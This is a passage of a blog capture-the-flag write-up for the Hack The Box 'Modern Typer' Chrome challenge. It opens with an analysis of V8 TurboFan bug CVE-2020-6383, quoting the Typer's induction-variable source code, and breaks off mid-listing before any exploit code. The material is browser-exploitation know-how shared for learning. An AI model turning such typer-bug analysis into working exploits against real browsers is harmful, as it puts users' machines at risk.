<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>HTB 2021: Modern Typer  - Even - A super concise theme for Hugo</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="ulexec" /><meta name="description" content="Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.
Prerequisites This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan." /><meta name="keywords" content="Hugo, theme, even" />






<meta name="generator" content="Hugo 0.107.0 with theme even" />


<link rel="canonical" href="http://ulexec.github.io/post/2021-04-09-htb_modern_typer/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.24b6bc5d736ac336a76f43f4279d691d2513ec072ed82cd608a6120e0aa90b85.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:title" content="HTB 2021: Modern Typer " />
<meta property="og:description" content="Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.
Prerequisites This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ulexec.github.io/post/2021-04-09-htb_modern_typer/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-04-09T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-04-09T00:00:00+00:00" />

<meta itemprop="name" content="HTB 2021: Modern Typer ">
<meta itemprop="description" content="Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.
Prerequisites This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan."><meta itemprop="datePublished" content="2021-04-09T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-04-09T00:00:00+00:00" />
<meta itemprop="wordCount" content="4678">
<meta itemprop="keywords" content="pwn,ctf,chrome," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTB 2021: Modern Typer "/>
<meta name="twitter:description" content="Overview SPOILER: This blog contains the solution of Modern Typer Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog. This challenge can be obtained from the Challenges section of hackthebox.
Prerequisites This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">ulexec 의 연구</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">ulexec 의 연구</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">About</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">HTB 2021: Modern Typer </h1>

      <div class="post-meta">
        <span class="post-time"> 2021-04-09 </span>
        <div class="post-category">
            <a href="/categories/writeup/"> Writeup </a>
            </div>
          <span class="more-meta"> 4678 words </span>
          <span class="more-meta"> 22 mins read </span>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#overview">Overview</a>
          <ul>
            <li><a href="#prerequisites">Prerequisites</a></li>
          </ul>
        </li>
        <li><a href="#an-overview-of-cve-2020-6383">An Overview of CVE-2020-6383</a>
          <ul>
            <li><a href="#typeinductionvariablephi-analysis">TypeInductionVariablePhi Analysis</a></li>
            <li><a href="#triggering-a-type-confusion">Triggering A Type Confusion</a></li>
            <li><a href="#reducejscreatearray-analysis">ReduceJSCreateArray Analysis</a></li>
            <li><a href="#exploitation">Exploitation</a></li>
            <li><a href="#mitigation">Mitigation</a></li>
          </ul>
        </li>
        <li><a href="#modern-typer">Modern Typer</a>
          <ul>
            <li><a href="#patch-file">Patch File</a></li>
          </ul>
        </li>
        <li><a href="#patch-analysis">Patch Analysis</a>
          <ul>
            <li><a href="#exploitation-1">Exploitation</a></li>
            <li><a href="#full-exploit">Full Exploit</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <h2 id="overview">Overview</h2>
<p><strong>SPOILER</strong>: This blog contains the solution of <code>Modern Typer</code> Chrome exploitation challenge from HTB. If you are planning to take this challenge, I would highly encourage attempting the challenge first before reading this blog.  This challenge can be obtained from the Challenges section of <a href="http://hackthebox.com">hackthebox</a>.</p>
<h3 id="prerequisites">Prerequisites</h3>
<p>This blog is not a Turbofan reference and is not intended to be. There are excellent public resources to acquire a basic understanding of Turbofan. Here are some of them:</p>
<ul>
<li>Basic understanding of TurboFan: <a href="https://doar-e.github.io/tag/turbofan.html">Jeremy Fetiveau blogs</a></li>
<li>Basic understanding of Sea-Of-Nodes: <a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/htmlpresent">Goolgle Presentation</a></li>
</ul>
<br />
<h2 id="an-overview-of-cve-2020-6383">An Overview of CVE-2020-6383</h2>
<p>Before digging through the challenge solution, first let&rsquo;s have an overview of a similar v8 typer bug to help us understand the root cause analysis of Modern Typer. This vulnerability is <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">CVE-2020-6383.</a>. I found this vulnerability by searching for older bugs affecting <code>JSCreateLowering::ReduceJSCreateArray</code> defined at <code>compiler/js-create-lowering.cc</code>. The relevance of understanding this bug in order to solve Modern Typer will be addressed later in this post.</p>
<h3 id="typeinductionvariablephi-analysis">TypeInductionVariablePhi Analysis</h3>
<p>CVE-2020-6383 involves a v8 type Inference vulnerability in <code>Typer::Visitor::TypeInductionVariablePhi</code> in <code>compiler/typer.cc</code>. When a function is attempted to be optimized by Turbofan, Turbofan&rsquo;s Typer will visit the graph of Ignition generated nodes to try to type and reduce them. The function <code>TypeInductionVariablePhi</code> is the function in charge to optimize for-loops and apply type inference analysis.</p>
<p>Let&rsquo;s break up the most relevant bits and pieces of this function before the patch for CVE-2020-6383 was applied:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">arity</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetControlInput</span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ControlInputCount</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">IrOpcode</span><span class="o">::</span><span class="n">kLoop</span><span class="p">,</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetControlInput</span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">opcode</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetControlInput</span><span class="p">(</span><span class="n">node</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">InputCount</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">auto</span> <span class="n">res</span> <span class="o">=</span> <span class="n">induction_vars_</span><span class="o">-&gt;</span><span class="n">induction_variables</span><span class="p">().</span><span class="n">find</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="n">DCHECK</span><span class="p">(</span><span class="n">res</span> <span class="o">!=</span> <span class="n">induction_vars_</span><span class="o">-&gt;</span><span class="n">induction_variables</span><span class="p">().</span><span class="n">end</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="n">InductionVariable</span><span class="o">*</span> <span class="n">induction_var</span> <span class="o">=</span> <span class="n">res</span><span class="o">-&gt;</span><span class="n">second</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span> <span class="n">arithmetic_type</span> <span class="o">=</span> <span class="n">induction_var</span><span class="o">-&gt;</span><span class="n">Type</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="n">initial_type</span> <span class="o">=</span> <span class="n">Operand</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="n">increment_type</span> <span class="o">=</span> <span class="n">Operand</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At the very beginning of the function, specific variables get initialized:</p>
<ul>
<li><code>initial_type</code>: holds the type of the driver variable of the for loop.</li>
<li><code>increment_type</code>: holds the type of the increment/decrement value applied to the driver variable in the for loop.</li>
<li><code>arithmetic_type</code>: holds the type of the arithmetic operation applied in the for loop, that being subtraction or addition.</li>
</ul>
<p>The function then evaluates the type of <code>initial_type</code> and <code>increment_type</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="k">const</span> <span class="kt">bool</span> <span class="n">both_types_integer</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">							  <span class="n">increment_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="n">maybe_nan</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// The addition or subtraction could still produce a NaN, if the integer
</span></span></span><span class="line"><span class="cl"><span class="c1">// ranges touch infinity.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">both_types_integer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">Type</span> <span class="n">resultant_type</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="o">?</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberAdd</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span> <span class="n">increment_type</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="o">:</span> <span class="n">typer_</span><span class="o">-&gt;</span><span class="n">operation_typer</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NumberSubtract</span><span class="p">(</span><span class="n">initial_type</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">													<span class="n">increment_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">maybe_nan</span> <span class="o">=</span> <span class="n">resultant_type</span><span class="p">.</span><span class="n">Maybe</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">NaN</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// We only handle integer induction variables (otherwise ranges
</span></span></span><span class="line"><span class="cl"><span class="c1">// do not apply and we cannot do anything).
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">both_types_integer</span> <span class="o">||</span> <span class="n">maybe_nan</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Fallback to normal phi typing, but ensure monotonicity.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// (Unfortunately, without baking in the previous type, monotonicity might
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// be violated because we might not yet have retyped the incrementing
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// operation even though the increment&#39;s type might been already reflected
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// in the induction variable phi.)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">Type</span> <span class="n">type</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">IsTyped</span><span class="p">(</span><span class="n">node</span><span class="p">)</span> <span class="o">?</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">										  <span class="o">:</span> <span class="n">Type</span><span class="o">::</span><span class="n">None</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">arity</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="n">type</span> <span class="o">=</span> <span class="n">Type</span><span class="o">::</span><span class="n">Union</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">Operand</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">i</span><span class="p">),</span> <span class="n">zone</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// If we do not have enough type information for the initial value or
</span></span></span><span class="line"><span class="cl"><span class="c1">// the increment, just return the initial value&#39;s type.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="n">initial_type</span><span class="p">.</span><span class="n">IsNone</span><span class="p">()</span> <span class="o">||</span> <span class="n">increment_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kSingletonZero</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">initial_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If the type of both <code>initial_type</code> and <code>increment_type</code> are of type <code>kInteger</code>, and the resultant type (stored in <code>resultant_type</code>) is nothing but the range of the minimum and maximum values these variables can hold. These ranges are obtained via <code>NumberAdd</code> and <code>NumberSubstract</code> returning an <code>AddRanger</code> or <code>SubstractRAnger</code> types accordingly.</p>
<p>In addition, the definition of the Type <code>kInteger</code> is the range of <code>-Infinity</code> to <code>+Infinity</code>, as defined in <code>compiler/type-cache.h</code> as shown below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">Type</span> <span class="k">const</span> <span class="n">kInteger</span> <span class="o">=</span> <span class="n">CreateRange</span><span class="p">(</span><span class="o">-</span><span class="n">V8_INFINITY</span><span class="p">,</span> <span class="n">V8_INFINITY</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The range type product of the addition or subtraction operation gets evaluated next, and the likelihood of the result of the correspondent arithmetic operation to be of type <code>NaN</code> (Not a Number) is stored in <code>maybe_nan</code>. This usually holds for arithmetic operations where both operands are Infinity.</p>
<p>On the other hand, if <code>resultant_type</code> is likely to be <code>NaN</code>, or either <code>initial_type</code> or <code>increment_type</code> is not of type <code>kInteger</code> then the function returns a <code>Union</code> with all the possible types based on each operand type.</p>
<p>If both operands are of type <code>kInteger</code> the bounds of their correspondent arithmetic operation ranges gets evaluated :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="c1">// Now process the bounds.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">double</span> <span class="n">min</span> <span class="o">=</span> <span class="o">-</span><span class="n">V8_INFINITY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">max</span> <span class="o">=</span> <span class="n">V8_INFINITY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">increment_min</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">increment_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">arithmetic_type</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kAddition</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">increment_min</span> <span class="o">=</span> <span class="n">increment_type</span><span class="p">.</span><span class="n">Min</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="n">increment_max</span> <span class="o">=</span> <span class="n">increment_type</span><span class="p">.</span><span class="n">Max</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">InductionVariable</span><span class="o">::</span><span class="n">ArithmeticType</span><span class="o">::</span><span class="n">kSubtraction</span><span class="p">,</span> <span class="n">arithmetic_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">increment_min</span> <span class="o">=</span> <span class="o">-</span><span class="n">increment_type</span><span class="p">.</span><span class="n">Max</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="n">increment_max</span> <span class="o">=</span> <span class="o">-</span><span class="n">increment_type</span><span class="p">.</span><span class="n">Min</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">increment_min</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// increasing sequence
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">min</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Min</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="nl">bound</span> <span class="p">:</span> <span class="n">induction_var</span><span class="o">-&gt;</span><span class="n">upper_bounds</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">Type</span> <span class="n">bound_type</span> <span class="o">=</span> <span class="n">TypeOrNone</span><span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">bound</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not an integer, just skip the bound.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bound_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not inhabited, then we can take the initial value.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="n">bound_type</span><span class="p">.</span><span class="n">IsNone</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">max</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Max</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="kt">double</span> <span class="n">bound_max</span> <span class="o">=</span> <span class="n">bound_type</span><span class="p">.</span><span class="n">Max</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">kind</span> <span class="o">==</span> <span class="n">InductionVariable</span><span class="o">::</span><span class="n">kStrict</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">bound_max</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">max</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">min</span><span class="p">(</span><span class="n">max</span><span class="p">,</span> <span class="n">bound_max</span> <span class="o">+</span> <span class="n">increment_max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// The upper bound must be at least the initial value&#39;s upper bound.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">max</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">max</span><span class="p">(</span><span class="n">max</span><span class="p">,</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Max</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">increment_max</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// decreasing sequence
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">max</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Max</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="nl">bound</span> <span class="p">:</span> <span class="n">induction_var</span><span class="o">-&gt;</span><span class="n">lower_bounds</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">Type</span> <span class="n">bound_type</span> <span class="o">=</span> <span class="n">TypeOrNone</span><span class="p">(</span><span class="n">bound</span><span class="p">.</span><span class="n">bound</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not an integer, just skip the bound.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bound_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">typer_</span><span class="o">-&gt;</span><span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kInteger</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// If the type is not inhabited, then we can take the initial value.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="n">bound_type</span><span class="p">.</span><span class="n">IsNone</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">min</span> <span class="o">=</span> <span class="n">initial_type</span><span class="p">.</span><span class="n">Min</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="kt">double</span> <span class="n">bound_min</span> <span class="o">=</span> <span class="n">bound_type</span><span class="p">.</span><span class="n">Min</span><span class="p">();</span>
